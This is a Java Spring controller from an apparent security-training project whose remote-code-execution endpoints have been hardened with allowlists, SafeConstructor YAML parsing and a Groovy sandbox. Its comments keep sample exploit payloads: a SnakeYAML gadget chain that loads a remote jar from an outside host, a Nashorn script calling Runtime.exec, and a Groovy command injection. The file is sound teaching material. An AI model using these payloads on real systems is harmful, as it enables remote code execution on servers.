package org.joychou.controller;

import org.springframework.web.util.HtmlUtils;
import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.ast.expr.BinaryExpression;
import org.codehaus.groovy.ast.expr.ConstantExpression;
import org.codehaus.groovy.ast.expr.Expression;
import org.codehaus.groovy.ast.stmt.BlockStatement;
import org.codehaus.groovy.ast.stmt.ExpressionStatement;
import org.codehaus.groovy.ast.stmt.ReturnStatement;
import org.codehaus.groovy.ast.stmt.Statement;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.codehaus.groovy.syntax.Types;
import org.joychou.security.SafeCommands;
import org.joychou.security.SecurityUtil;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    /** Fixed set of Groovy scripts that may be evaluated; keys are the accepted request tokens. */
    private static final Map<String, String> GROOVY_SCRIPTS;

    static {
        Map<String, String> m = new HashMap<String, String>();
        m.put("sum", "1 + 2");
        m.put("product", "6 * 7");
        GROOVY_SCRIPTS = Collections.unmodifiableMap(m);
    }

    @GetMapping(value = "/runtime/exec", produces = MediaType.TEXT_PLAIN_VALUE + ";charset=UTF-8")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            // No request data reaches the process: the token selects a server-owned constant argv.
            String[] argv = SafeCommands.lookup(cmd);
            if (argv == null) {
                return "Bad boy. I got u.";
            }
            Process p = new ProcessBuilder(argv).start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping(value = "/ProcessBuilder", produces = MediaType.TEXT_PLAIN_VALUE + ";charset=UTF-8")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            // No request data reaches the process: the token selects a server-owned constant argv.
            String[] arrCmd = SafeCommands.lookup(cmd);
            if (arrCmd == null) {
                return "Bad boy. I got u.";
            }
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        // Only load scripts from allowlisted domains, and pass the URL as a binding
        // instead of concatenating it into script source.
        String safeUrl = SecurityUtil.checkURL(jsurl);
        if (safeUrl == null) {
            return;
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        bindings.put("jsurl", safeUrl);
        engine.eval("load(jsurl)", bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor: only standard YAML types, no arbitrary class instantiation.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Request text is never compiled: it only selects a server-owned constant script.
        String script = GROOVY_SCRIPTS.get(content == null ? "" : content.trim());
        if (script == null) {
            return;
        }
        // Sandbox: only literals and arithmetic are compilable; no imports, method calls,
        // property access, closures, or method definitions.
        SecureASTCustomizer secure = new SecureASTCustomizer();
        secure.setMethodDefinitionAllowed(false);
        secure.setClosuresAllowed(false);
        secure.setPackageAllowed(false);
        secure.setImportsWhitelist(Collections.<String>emptyList());
        secure.setStarImportsWhitelist(Collections.<String>emptyList());
        secure.setStaticImportsWhitelist(Collections.<String>emptyList());
        secure.setStaticStarImportsWhitelist(Collections.<String>emptyList());
        secure.setIndirectImportCheckEnabled(true);
        secure.setReceiversClassesWhiteList(Collections.<Class>emptyList());
        secure.setStatementsWhitelist(Arrays.<Class<? extends Statement>>asList(
                BlockStatement.class, ExpressionStatement.class, ReturnStatement.class));
        secure.setExpressionsWhitelist(Arrays.<Class<? extends Expression>>asList(
                ConstantExpression.class, BinaryExpression.class));
        secure.setTokensWhitelist(Arrays.asList(
                Types.PLUS, Types.MINUS, Types.MULTIPLY, Types.DIVIDE));
        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secure);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(script);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

